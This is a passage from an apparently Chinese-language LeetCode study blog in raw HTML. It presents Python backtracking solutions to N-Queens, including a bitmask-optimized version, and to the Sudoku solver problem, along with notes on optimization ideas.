comment">#初始化一个棋盘</span>        board<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'.'</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token comment">#进行dfs</span>        <span class="token comment">#index == rows</span>        <span class="token keyword">def</span> <span class="token function">islegal</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>cols<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment">#理论上cols不可能冲突</span>            <span class="token comment">#检测rows冲突</span>            <span class="token keyword">if</span> index <span class="token operator">>=</span><span class="token number">0</span> <span class="token keyword">and</span> cols <span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> i<span class="token operator">>=</span><span class="token number">0</span> <span class="token keyword">and</span> board<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>cols<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'Q'</span><span class="token punctuation">:</span>                        <span class="token keyword">return</span> <span class="token boolean">False</span>            <span class="token comment">#检测左上是否冲突</span>                <span class="token keyword">for</span> i<span class="token punctuation">,</span>j <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>index<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">tuple</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>cols<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 修改这一行</span>                    <span class="token keyword">if</span> i<span class="token operator">>=</span><span class="token number">0</span> <span class="token keyword">and</span> board<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'Q'</span><span class="token punctuation">:</span>                        <span class="token keyword">return</span> <span class="token boolean">False</span>            <span class="token comment">#检测右上是否冲突</span>                <span class="token keyword">for</span> i<span class="token punctuation">,</span>j <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>index<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">tuple</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>cols<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 修改这一行</span>                    <span class="token keyword">if</span> i<span class="token operator">>=</span><span class="token number">0</span> <span class="token keyword">and</span> board<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'Q'</span><span class="token punctuation">:</span>                        <span class="token keyword">return</span> <span class="token boolean">False</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> index <span class="token operator">==</span> n<span class="token punctuation">:</span>                path<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>                <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>                    path<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>board<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>path<span class="token punctuation">)</span>                <span class="token keyword">return</span>            <span class="token keyword">for</span> cols <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> islegal<span class="token punctuation">(</span>index<span class="token punctuation">,</span>cols<span class="token punctuation">)</span><span class="token punctuation">:</span>                    board<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>cols<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'Q'</span>                    dfs<span class="token punctuation">(</span>index<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>                    board<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>cols<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'.'</span>        dfs<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>优化的思路</p><ul><li>可以用一个一维数组来存储每一行皇后的列位置，而不是用一个二维数组来表示整个棋盘。这样可以节省空间，也可以简化判断是否合法的逻辑。</li><li>可以用位运算来加速判断是否合法的过程。具体地，你可以用三个整数来分别记录每一列，每一条主对角线，和每一条副对角线上是否已经有皇后。每次放置一个皇后时，你只需要检查当前位置的列，主对角线，和副对角线是否为 0，如果是，说明可以放置，然后更新这三个整数的相应位为 1。这样可以避免使用循环和数组索引，提高效率</li><li>可以用一个全局变量来记录最终的结果，而不是作为参数传递。这样可以避免不必要的拷贝，也可以简化函数的参数列表。</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">solveNQueens</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> n<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token comment"># 用一个全局变量来存储结果</span>        self<span class="token punctuation">.</span>result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token comment"># 用一个一维数组来存储每一行皇后的列位置</span>        board <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> n        <span class="token comment"># 用三个整数来分别记录每一列，每一条主对角线，和每一条副对角线上是否已经有皇后</span>        <span class="token comment"># 用位运算来加速判断和更新</span>        self<span class="token punctuation">.</span>cols <span class="token operator">=</span> <span class="token number">0</span>        self<span class="token punctuation">.</span>diag1 <span class="token operator">=</span> <span class="token number">0</span>        self<span class="token punctuation">.</span>diag2 <span class="token operator">=</span> <span class="token number">0</span>        <span class="token comment"># 从第 0 行开始回溯</span>        self<span class="token punctuation">.</span>dfs<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> board<span class="token punctuation">)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>result        <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> row<span class="token punctuation">,</span> n<span class="token punctuation">,</span> board<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 如果已经到达最后一行，说明找到了一个解</span>        <span class="token keyword">if</span> row <span class="token operator">==</span> n<span class="token punctuation">:</span>            <span class="token comment"># 根据 board 数组生成棋盘字符串</span>            path <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>                s <span class="token operator">=</span> <span class="token string">"."</span> <span class="token operator">*</span> board<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"Q"</span> <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">*</span> <span class="token punctuation">(</span>n <span class="token operator">-</span> board<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>                path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">)</span>            <span class="token comment"># 将结果添加到全局变量中</span>            self<span class="token punctuation">.</span>result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token comment"># 遍历当前行的每一列</span>        <span class="token keyword">for</span> col <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># 计算当前位置的主对角线和副对角线的索引</span>            d1 <span class="token operator">=</span> row <span class="token operator">+</span> col            d2 <span class="token operator">=</span> row <span class="token operator">-</span> col <span class="token operator">+</span> n <span class="token operator">-</span> <span class="token number">1</span>            <span class="token comment"># 用位运算判断当前位置的列，主对角线，和副对角线是否为空</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>cols <span class="token operator">>></span> col<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>diag1 <span class="token operator">>></span> d1<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>diag2 <span class="token operator">>></span> d2<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token comment"># 如果为空，说明可以放置皇后</span>                <span class="token comment"># 更新 board 数组</span>                board<span class="token punctuation">[</span>row<span class="token punctuation">]</span> <span class="token operator">=</span> col                <span class="token comment"># 更新三个整数，将相应的位设为 1</span>                self<span class="token punctuation">.</span>cols <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> col                self<span class="token punctuation">.</span>diag1 <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> d1                self<span class="token punctuation">.</span>diag2 <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> d2                <span class="token comment"># 继续下一行的回溯</span>                self<span class="token punctuation">.</span>dfs<span class="token punctuation">(</span>row <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> board<span class="token punctuation">)</span>                <span class="token comment"># 回溯后，恢复 board 数组和三个整数的状态，将相应的位设为 0</span>                board<span class="token punctuation">[</span>row<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>                self<span class="token punctuation">.</span>cols <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> col<span class="token punctuation">)</span>                self<span class="token punctuation">.</span>diag1 <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> d1<span class="token punctuation">)</span>                self<span class="token punctuation">.</span>diag2 <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> d2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="37-解数独"><a class="markdownIt-Anchor" href="#37-解数独"></a> <a href="https://leetcode.cn/problems/sudoku-solver/">37. 解数独</a></h3><p>编写一个程序，通过填充空格来解决数独问题。</p><p>数独的解法需 <strong>遵循如下规则</strong>：</p><ol><li>数字 <code>1-9</code> 在每一行只能出现一次。</li><li>数字 <code>1-9</code> 在每一列只能出现一次。</li><li>数字 <code>1-9</code> 在每一个以粗实线分隔的 <code>3x3</code> 宫内只能出现一次。（请参考示例图）</li></ol><p>数独部分空格内已填入了数字，空白格用 <code>'.'</code> 表示。</p><h4 id="思路-15"><a class="markdownIt-Anchor" href="#思路-15"></a> 思路</h4><p>与N皇后十分相似，这题的解法也很明显，就是一个一个试，知道所有格子都填满，但是不同的在于，每一行每一列都需要遍历，所以这是二维回溯，前面的都是一维的回溯</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">solveSudoku</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> board<span class="token punctuation">:</span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        Do not return anything, modify board in-place instead.        """</span>        rows<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>board<span class="token punctuation">)</span>        cols<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>board<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>board<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment">#若有解返回True 无解则返回False</span>            <span class="token keyword">for</span> row <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>rows<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> col <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>cols<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token comment">#若格子里面有数字就直接跳过</span>                    <span class="token keyword">if</span> board<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'.'</span><span class="token punctuation">:</span>                        <span class="token keyword">continue</span>                    <span class="token comment">#逐个从1-9的数字中尝试填入这个格子</span>                    <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> isValid<span class="token punctuation">(</span>row<span class="token punctuation">,</span>col<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">:</span>                            board<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span>                            <span class="token comment">#填入下一个</span>                            <span class="token keyword">if</span>  dfs<span class="token punctuation">(</span>board<span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">return</span> <span class="token boolean">True</span>                            <span class="token comment">#回溯</span>                            board<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'.'</span>                    <span class="token comment">#如果9个数字都填过，说明这一步就无解，回溯到上一格子填入其他数字</span>                    <span class="token keyword">return</span> <span class="token boolean">False</span>            <span class="token comment">#递归结束 有解</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">def</span> <span class="token function">isValid</span><span class="token punctuation">(</span>row<span class="token punctuation">,</span>col<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment">#同一列无重复的,范围一定是0-8  预设的还会有数字</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> board<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token builtin">str</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token boolean">False</span>            <span class="token comment">#同一行无重复</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> board<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token builtin">str</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token boolean">False</span>            <span class="token comment">#3X3九宫格无重复</span>            startRow<span class="token operator">=</span><span class="token punctuation">(</span>row<span class="token operator">//</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>            startCol<span class="token operator">=</span><span class="token punctuation">(</span>col<span class="token operator">//</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>startRow<span class="token punctuation">,</span>startRow<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>startCol<span class="token punctuation">,</span>startCol<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> board<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token builtin">str</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">return</span> <span class="token boolean">False</span>            <span class="token comment">#如何这些限制条件都符合就可以放置</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        dfs<span class="token punctuation">(</span>board<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>提交，过了，400多ms，尝试一下优化</p><h4 id="优化"><a class="markdownIt-Anchor" href="#优化"></a> 优化</h4><ul><li>初始化9个行set 快速查找行内是否存在重复,就不必n^2的查重操作了</li><li>9个列set 同理</li><li>9个块set</li><li>用一个empty_list存一下需要填的位置</li><li>开始回溯, 每次只放不重复的元素, 如果找到结果立刻返回, 不需要再多余计算</li><li>最后把结果填进原数组即可</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">solveSudoku</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> board<span class="token punctuation">:</span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        Do not return anything, modify board in-place instead.        """</span>        lines <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        cols <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        sqs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        empty_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i<span class="token punctuation">,</span> line <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>board<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> j<span class="token punctuation">,</span> ch <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> ch <span class="token operator">==</span> <span class="token string">'.'</span><span class="token punctuation">:</span>                    empty_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>add<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>                    cols<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>add<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>                    sqs<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">//</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token punctuation">(</span>j <span class="token operator">//</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span>add<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>        res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> k <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>empty_list<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token boolean">True</span>            i<span class="token punctuation">,</span> j <span class="token operator">=</span> empty_list<span class="token punctuation">[</span>k<span class="token punctuation">]</span>            <span class="token keyword">for</span> ch <span class="token keyword">in</span> <span class="token string">'123456789'</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span>ch <span class="token keyword">in</span> lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> ch <span class="token keyword">in</span> cols<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token keyword">or</span> ch <span class="token keyword">in</span> sqs<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">//</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token punctuation">(</span>j <span class="token operator">//</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>add<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>                    cols<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>add<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>                    sqs<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">//</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token punctuation">(</span>j <span class="token operator">//</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span>add<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>                    res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>                    <span class="token keyword">if</span> dfs<span class="token punctuation">(</span>k<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">return</span> <span class="token boolean">True</span>                    res<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>                    lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>remove<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>                    cols<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>remove<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>                    sqs<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">//</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token punctuation">(</span>j <span class="token operator">//</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span>remove<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        dfs<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> r <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>empty_list<span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">:</span>            board<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 